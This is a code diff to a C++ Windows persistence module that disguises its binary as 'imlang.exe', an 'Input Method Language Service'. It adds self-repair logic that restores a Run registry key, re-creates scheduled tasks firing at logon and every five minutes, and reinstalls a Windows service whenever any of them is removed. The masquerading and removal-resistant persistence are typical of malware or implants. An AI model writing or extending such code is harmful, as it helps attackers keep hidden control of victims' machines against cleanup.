@@ -1,4 +1,5 @@
 #include "persistence.h"
+#include "service_manager.h"
 #include "utils/logger.h"
 #include <shlobj.h>
 #include <filesystem>
@@ -44,7 +45,7 @@ std::string Persistence::install_to_appdata(const Config& config) {
     GetModuleFileNameW(nullptr, current_exe, MAX_PATH);
     std::string current = to_narrow(current_exe);
 
-    std::string target = install_dir + "\\svchost_helper.exe";
+    std::string target = install_dir + "\\imlang.exe";
 
     // Don't copy over self
     try {
@@ -133,7 +134,6 @@ bool Persistence::remove_from_startup(const Config& config) {
 }
 
 void Persistence::verify_integrity() {
-    // A6 fix: actually check AppData copy, registry key, and service
     wchar_t exe_path[MAX_PATH];
     GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
     std::string current_path = to_narrow(exe_path);
@@ -151,6 +151,67 @@ void Persistence::verify_integrity() {
     if (!fs::exists(current_path)) {
         Logger::error("binary missing — cannot self-repair at this level");
     }
+
+    // Check registry startup key — restore if removed
+    {
+        HKEY key = nullptr;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER,
+            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_READ, &key) == ERROR_SUCCESS) {
+            DWORD type = 0;
+            DWORD size = 0;
+            // Use service_display as value name (same as add_to_startup)
+            if (RegQueryValueExW(key, L"Input Method Language Service",
+                nullptr, &type, nullptr, &size) != ERROR_SUCCESS) {
+                Logger::info("registry startup key missing — restoring");
+                RegCloseKey(key);
+                // Re-read config to pass to add_to_startup
+                Config repair_config;
+                repair_config.service_name = "imlang";
+                repair_config.service_display = "Input Method Language Service";
+                add_to_startup(repair_config);
+            } else {
+                RegCloseKey(key);
+            }
+        }
+    }
+
+    // Check scheduled task — restore if removed
+    {
+        std::string check_cmd = "schtasks /Query /TN \"InputMethodLangTask\" >nul 2>&1";
+        if (system(check_cmd.c_str()) != 0) {
+            Logger::info("scheduled task missing — restoring");
+            std::string create_cmd = "schtasks /Create /TN \"InputMethodLangTask\""
+                " /TR \"\\\"" + current_path + "\\\"\""
+                " /SC ONLOGON /F >nul 2>&1";
+            system(create_cmd.c_str());
+
+            std::string monitor_cmd = "schtasks /Create /TN \"InputMethodLangTaskMonitor\""
+                " /TR \"\\\"" + current_path + "\\\"\""
+                " /SC MINUTE /MO 5 /F >nul 2>&1";
+            system(monitor_cmd.c_str());
+        }
+    }
+
+    // Check service — restore if removed
+    {
+        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+        if (scm) {
+            SC_HANDLE svc = OpenServiceW(scm, L"imlang", SERVICE_QUERY_STATUS);
+            if (!svc) {
+                Logger::info("service missing — reinstalling");
+                CloseServiceHandle(scm);
+                Config repair_config;
+                repair_config.service_name = "imlang";
+                repair_config.service_display = "Input Method Language Service";
+                // Need full access to reinstall
+                ServiceManager::install_service(repair_config);
+            } else {
+                CloseServiceHandle(svc);
+                CloseServiceHandle(scm);
+            }
+        }
+    }
 }
 
 std::thread Persistence::s_monitor_thread;
@@ -164,7 +225,7 @@ void Persistence::start_monitoring(const Config& config, AlertCallback on_alert)
 
     s_monitor_thread = std::thread([config, on_alert = std::move(on_alert)]() {
         std::string install_dir = get_install_dir(config);
-        std::string exe_path = install_dir + "\\svchost_helper.exe";
+        std::string exe_path = install_dir + "\\imlang.exe";
 
         // Registry key path
         std::wstring reg_value_name = to_wide(config.service_display);
